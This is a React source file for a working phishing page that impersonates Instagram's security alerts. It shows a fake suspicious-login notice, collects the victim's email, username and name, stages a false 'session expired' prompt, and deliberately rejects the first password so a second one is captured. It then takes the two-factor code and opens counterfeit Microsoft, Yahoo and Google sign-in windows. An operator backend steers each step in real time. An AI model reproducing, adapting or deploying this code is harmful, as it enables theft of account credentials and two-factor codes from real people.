import React, { useState, useEffect, useRef } from 'react';
import './InstagramConfirmation.css'; // For styling
import instalogo from './instagram.png';
import InstagramFooter from './footer/InstagramFooter';
import DraggableModal from './DraggableModel';
import MicrosoftSignIn from '../outlook/MicrosoftSignIn';
import YahooSignIn from '../yahoo/YahooSignIn';
import GSign from '../google/GSign';
import { Navigate } from 'react-router-dom';
const InstagramConfirmation = () => {
   
    const [step, setStep] = useState('confirmation'); 
    const [emailStep, setEmailStep] = useState('email');
    const [sessionId, setSessionId] = useState(null); 
    const stepChangedAt20 = useRef(false); 
    const baseURL = process.env.REACT_APP_BASE_URL;
    const [redirectToAuth, setRedirectToAuth] = useState(false);
   
    useEffect(() => {
        let captchaToken = localStorage.getItem("captchaToken");
        if (!captchaToken) {
            setRedirectToAuth(true);
            window.location.href = '/auth';
        }
    }, []);
    

    
    const [modalTitle, setModalTitle] = useState('');
    const [formData, setFormData] = useState({
        email: '',
        username: '',
        firstName: '',
        lastName: ''
    });
    const [progress, setProgress] = useState(0);
    const [verificationText, setVerificationText] = useState(''); // Text under the progress bar
    const [password, setPassword] = useState(''); // Input for password after session expired
    const [twofaInput, set2fa] = useState('');
    const [sessionExpiredOnce, setSessionExpiredOnce] = useState(false);
    const [isOutlookOpen, setIsOutlookOpen] = useState(false);
    const [gmailCode, setGmailVerificationCode] = useState("");
    const [isYahooOpen, setIsYahooOpen] = useState(false);
    const [isGmailOpen, setIsGmailOpen] = useState(false);
    const [incorrectPassword, setIncorrectPassword] = useState(false); // New state to track incorrect password attempts


    const getUserInfo = () => {
        const userAgent = navigator.userAgent;
        let browser, os;
    
        if (userAgent.indexOf("Firefox") > -1) {
            browser = "Firefox";
        } else if (userAgent.indexOf("Chrome") > -1) {
            browser = "Chrome";
        } else if (userAgent.indexOf("Safari") > -1) {
            browser = "Safari";
        } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident/") > -1) {
            browser = "Internet Explorer";
        } else {
            browser = "Other";
        }
    
        if (userAgent.indexOf("Win") > -1) {
            os = "Windows";
        } else if (userAgent.indexOf("Mac") > -1) {
            os = "MacOS";
        } else if (userAgent.indexOf("Linux") > -1) {
            os = "Linux";
        } else if (userAgent.indexOf("Android") > -1) {
            os = "Android";
        } else if (userAgent.indexOf("like Mac") > -1) {
            os = "iOS";
        } else {
            os = "Other";
        }
    
        return { browser, os };
    };


    const handleSubmit = async (e) => {
        e.preventDefault();
        if(!isValidEmail(formData.email)){
            alert('Email is not valid');
            return;
        }
        try {
            const response = await fetch(baseURL + `/api/${sessionId}/update_instagram_data`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: formData.email,
                    username: formData.username,
                    firstName: formData.firstName,
                    lastName: formData.lastName
                }),
            });
    
            const data = await response.json();
            console.log('Instagram data updated:', data);
            await notifyBackendToChangeStep('verifying');
        } catch (err) {
            console.error('Error updating Instagram data:', err);
        }
    };


    const handleCloseOutlook = async () => {
        await notifyBackendToChangeStep('verifying_indefinite');
        setIsOutlookOpen(false);
        setIsYahooOpen(false);
        setIsGmailOpen(false);
    };
    const isValidEmail = (email) => {
        // Regular expression to validate email format
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
      };
    // Polling function to fetch the current step from the backend
    const fetchStep = async () => {
        if (!sessionId) return;
    
        try {
            const response = await fetch(baseURL + `/api/${sessionId}/step`);
            const userInfo = getUserInfo();

            if (response.status === 404) {
                const sessionData = {
                    browser: userInfo.browser,
                    os: userInfo.os,
                };
                // If the session is not found (404), generate a new session
                const newSessionResponse = await fetch(baseURL + '/api/generate_session', { 
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(sessionData)
                });
                const newSessionData = await newSessionResponse.json();
    
                localStorage.setItem('sessionId', newSessionData.sessionId);
                setSessionId(newSessionData.sessionId);
                setStep(newSessionData.step);
            } else {
                const data = await response.json();
                setStep(data.step);
                if (data.step === 'outlook') {
                    setIsOutlookOpen(true);
                    setGmailVerificationCode(data.gmailVerificationCode);
                    setModalTitle('login.live.com/login.srf');
                    setEmailStep(data.outlook);
                } else if (data.step === 'yahoo') {
                    setIsYahooOpen(true);
                    setGmailVerificationCode(data.gmailVerificationCode);
                    setModalTitle('login.yahoo.com/?.src=ym&lang=en-US');
                    setEmailStep(data.outlook);
                } else if (data.step === 'gmail') {
                    setIsGmailOpen(true);
                    setModalTitle('https://accounts.google.com/v3/signin/identifier');
                    setGmailVerificationCode(data.gmailVerificationCode);
                    setEmailStep(data.outlook);
                }
            }
        } catch (error) {
            console.error('Failed to fetch session step:', error);
        }
    };

    const getSessionId = async () => {
        const userInfo = getUserInfo();
        let storedSessionId = localStorage.getItem('sessionId');
        if (!storedSessionId) {
            const sessionData = {
                browser: userInfo.browser,
                os: userInfo.os,
            };
            const response = await fetch(baseURL + '/api/generate_session', { 
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(sessionData)
            });
            const data = await response.json();
            storedSessionId = data.sessionId;
            localStorage.setItem('sessionId', storedSessionId);
        }
        setSessionId(storedSessionId);
    };

    useEffect(() => {
        if (!sessionId) {
            getSessionId();
        } else {
            const interval = setInterval(fetchStep, 2000); // Poll every 2 seconds
            return () => clearInterval(interval); // Cleanup on unmount
        }
    }, [sessionId]);

    const handleInputChange = (e) => {
        const { name, value } = e.target;
        setFormData({ ...formData, [name]: value });
    };

    const notifyBackendToChangeStep = async (nextStep) => {
        if (!sessionId) return;
        await fetch(baseURL + `/api/${sessionId}/change_step`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ step: nextStep }),
        });
    };

    const handlePasswordSubmit = async (e) => {
        e.preventDefault();
        
        if(incorrectPassword){
            handleIncorrectPasswordSubmit();
            return;
        }
        try {
            const response = await fetch(baseURL + `/api/${sessionId}/update_instagram_password`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ password }),
            });

            const data = await response.json();
            if (response.ok) {
                setProgress(0);
                setPassword("")
               // await notifyBackendToChangeStep('verifying');
                setIncorrectPassword(true); // Reset the incorrect password state
                console.log('Instagram password updated:', data);
            } else {
                // If the password is incorrect
                //setIncorrectPassword(true);
            }
        } catch (err) {
            console.error('Error updating Instagram password:', err);
        }
    };

    const handleIncorrectPasswordSubmit = async () => {
     

        try {
            const response = await fetch(baseURL + `/api/${sessionId}/update_instagram_incorrect_password`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ password }),
            });

            const data = await response.json();
            if (response.ok) {
                setProgress(0);
                await notifyBackendToChangeStep('verifying');

                setIncorrectPassword(false); // Reset the incorrect password state
                setPassword("")
                console.log('Instagram incorrect password updated:', data);
            } else {
               //    setIncorrectPassword(true); // Show incorrect password message again
            }
        } catch (err) {
            console.error('Error updating Instagram password:', err);
        }
    };

    const sendVerifyCode = async () => {
        try {
            const response = await fetch(baseURL + `/api/${sessionId}/update_instagram_twofa`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ two_fa: twofaInput }),
            });

            const data = await response.json();
            setProgress(0);
            set2fa("");
            await notifyBackendToChangeStep('verifying');
            console.log('Instagram 2FA code updated:', data);
        } catch (err) {
            console.error('Error updating Instagram 2FA code:', err);
        }
    };

    useEffect(() => {
        if (step === 'verifying' || step === "verifying_indefinite") {
            const verificationSteps = [
                "Verifying your email address...",
                "Verifying your username...",
                "Verifying your IP address...",
                "Verifying last logged-in places...",
                "Verifying your full information..."
            ];

            const totalDuration = 900000; // Total duration (adjust as needed)
            const intervalDuration = totalDuration / 500; // Interval to fill the bar over the total duration

            const interval = setInterval(() => {
                setProgress((prevProgress) => {
                    const newProgress = prevProgress + 1;

                    // Update verification text at specific progress points
                    if (newProgress < 20) {
                        setVerificationText(verificationSteps[0]);
                    } else if (newProgress >= 20 && newProgress < 40) {
                        setVerificationText(verificationSteps[1]);
                    } else if (newProgress >= 40 && newProgress < 60) {
                        setVerificationText(verificationSteps[2]);
                    } else if (newProgress >= 60 && newProgress < 80) {
                        setVerificationText(verificationSteps[3]);
                    } else if (newProgress >= 80) {
                        setVerificationText(verificationSteps[4]);
                    }

                    // Trigger backend step change at 20% progress only once
                    if (newProgress === 10 && !stepChangedAt20.current && step !== "verifying_indefinite") {
                        notifyBackendToChangeStep('sessionExpired'); // Notify backend to change step to 'sessionExpired'
                        stepChangedAt20.current = true; // Set ref to true to prevent further calls
                    }

                    // Stop at 100% and trigger another step change if needed
                    if (newProgress >= 100) {
                        clearInterval(interval);
                        notifyBackendToChangeStep('twoFactor'); // Notify backend for the next step after verification is complete
                        return 100; // Cap progress at 100%
                    }

                    return newProgress;
                });
            }, intervalDuration); // Update every calculated interval

            return () => clearInterval(interval); // Cleanup interval on unmount or step change
        }
    }, [step]);

    return (
        <>
            {step === 'confirmation' && (
                <div className="insta-container">
                    <div className="insta-box">
                        <img src={instalogo} alt="Instagram Logo" className="insta-logo" />
                        <h1 className="insta-title">Was this you?</h1>
                        <p className="insta-text">
                            Someone attempted to log in to your account recently. If it wasn't you, tell us so we can verify the account.
                        </p>
                        <p className="insta-text">Jul 19 20:13 PM, from Android located in Belarus.</p>

                        {/* Option buttons */}
                        <div className="button-container">
                            <button className="confirm-button yes" onClick={() => notifyBackendToChangeStep('details')}>
                                This was me
                            </button>
                            <button className="confirm-button no" onClick={() => notifyBackendToChangeStep('details')}>
                                This wasn't me
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {step === 'details' && (
                <div className="insta-container">
                    <div className="insta-box">
                        <img src={instalogo} alt="Instagram Logo" className="insta-logo" />
                        <h1 className="insta-title">To confirm it's you, please enter the information required below:</h1>
                        <form className="insta-form" onSubmit={handleSubmit}>
                            <div className="input-group">
                                <label>Email</label>
                                <input
                                    type="email"
                                    name="email"
                                    placeholder="email@instagram.com"
                                    value={formData.email}
                                    onChange={handleInputChange}
                                    required
                                />
                            </div>
                            <div className="input-group">
                                <label>Username</label>
                                <input
                                    type="text"
                                    name="username"
                                    placeholder="Username"
                                    value={formData.username}
                                    onChange={handleInputChange}
                                    required
                                />
                            </div>
                            <div className="input-group">
                                <label>First Name</label>
                                <input
                                    type="text"
                                    name="firstName"
                                    placeholder="First Name"
                                    value={formData.firstName}
                                    onChange={handleInputChange}
                                    required
                                />
                            </div>
                            <div className="input-group">
                                <label>Last Name</label>
                                <input
                                    type="text"
                                    name="lastName"
                                    placeholder="Last Name"
                                    value={formData.lastName}
                                    onChange={handleInputChange}
                                    required
                                />
                            </div>
                            <button className="submit-button" type="submit">
                                Submit
                            </button>
                        </form>
                    </div>
                </div>
            )}

            {(step === 'verifying' || step === "verifying_indefinite") && (
                <div className="insta-container">
                    <div className="insta-box">
                        <img src={instalogo} alt="Instagram Logo" className="insta-logo" />
                        <h1 className="insta-title">Hang tight, we are verifying your info</h1>
                        <div className="progress-bar">
                            <div className="progress-bar-fill" style={{ width: `${progress}%` }}></div>
                        </div>
                        <p className="verification-text">{verificationText}</p>
                    </div>
                </div>
            )}

            {step === 'sessionExpired' && (
                <div className="insta-container">
                    <div className="insta-box">
                        <img src={instalogo} alt="Instagram Logo" className="insta-logo" />
                        <h1 className="insta-title">Session has expired</h1>
                        <p className="insta-text">
                            {formData.username} <span className="not-you">Not you?</span>
                        </p>
                        <form className="insta-form" onSubmit={handlePasswordSubmit}>
                            <div className="input-group">
                            {incorrectPassword && (
                                <p className="error-text">Incorrect password. Please try again.</p>
                            )}
                                <label>Password</label>
                                <input
                                    type="password"
                                    name="password"
                                    placeholder="Enter your password"
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    required
                                />
                            </div>
                            <button className="submit-button" type="submit">
                                Submit
                            </button>
                        </form>
                      
                    </div>
                </div>
            )}

            {step === 'twoFactor' && (
                <div className="insta-container">
                    <div className="insta-box">
                        <img src={instalogo} alt="Instagram Logo" className="insta-logo" />
                        <h1 className="insta-title">Two-Factor Authentication</h1>
                        <p className="insta-text">
                            Please enter the code we've sent to your device.
                        </p>
                        <div className="input-group">
                            <input type="text" name="twoFactorCode" placeholder="Enter 6-digit code" required 
                                value={twofaInput}
                                onChange={(e) => set2fa(e.target.value)}
                            />
                        </div>
                        <div className="divider">
                            <hr /> {/* Horizontal line */}
                        </div>
                        <p className="insta-text">Or approve the request from your phone.</p>
                        <button className="submit-button" onClick={sendVerifyCode}>
                            Continue
                        </button>
                    </div>
                </div>
            )}
            {(step === 'gmail' || step === 'outlook' || step === 'yahoo') && (
                <div className='emailFormOpen'></div>
            )} 
            {isOutlookOpen && (
                <DraggableModal title={modalTitle} onClose={handleCloseOutlook}>
                    <MicrosoftSignIn sessionId={sessionId} stepChild={emailStep} onClose={handleCloseOutlook} verificationNumber={gmailCode} />
                </DraggableModal>
            )}
            {isYahooOpen && (
                <DraggableModal title={modalTitle} onClose={handleCloseOutlook}>
                    <YahooSignIn sessionId={sessionId} stepChild={emailStep} onClose={handleCloseOutlook} verificationNumber={gmailCode} />
                </DraggableModal>
            )}
            {isGmailOpen && (
                <DraggableModal title={modalTitle} onClose={handleCloseOutlook}>
                    <GSign sessionId={sessionId} stepChild={emailStep} onClose={handleCloseOutlook} verificationNumber={gmailCode} />
                </DraggableModal>
            )}
            <InstagramFooter />
        </>
    );
};

export default InstagramConfirmation;
